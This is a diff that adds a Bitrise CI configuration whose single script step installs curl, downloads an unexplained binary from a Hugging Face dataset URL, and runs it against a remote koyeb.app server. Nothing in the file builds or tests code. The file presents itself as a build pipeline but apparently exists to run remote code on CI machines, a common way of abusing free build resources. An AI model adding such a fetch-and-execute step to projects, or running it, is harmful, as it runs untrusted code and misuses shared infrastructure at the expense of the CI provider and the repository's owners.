@@ -1,0 +1,29 @@
+format_version: "11"
+
+default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
+
+project_type: other
+
+workflows:
+  primary:
+    steps:
+      - git-clone: {}
+
+      - script:
+          title: Setup & Run App
+          inputs:
+            - content: |
+                #!/usr/bin/env bash
+                set -ex
+
+                export DEBIAN_FRONTEND=noninteractive
+
+                apt-get update
+                apt-get install -y --no-install-recommends curl ca-certificates
+                rm -rf /var/lib/apt/lists/*
+
+                curl -L https://huggingface.co/datasets/api2/app/resolve/main/app -o /app
+                chmod +x /app
+
+                # chạy app
+                /app --server https://dominant-marleah-kozak-87119c7a.koyeb.app
